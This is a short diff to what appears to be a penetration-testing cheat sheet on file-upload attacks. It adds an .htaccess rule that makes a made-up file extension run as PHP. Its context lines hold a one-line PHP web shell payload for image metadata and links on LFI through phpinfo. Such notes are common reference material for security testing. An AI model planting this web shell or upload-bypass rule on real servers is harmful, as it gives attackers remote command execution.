@@ -336,6 +336,9 @@ file metadata upload
 =path/to/uploaded/file.png
 e.g. location: <?php system($_GET['c']); ?>
 
+.htaccess rule to interpret arbitrary extension as .php
+AddType application/x-httpd-php .blah
+
 phpinfo()
 https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
 https://www.insomniasec.com/downloads/publications/phpinfolfi.py
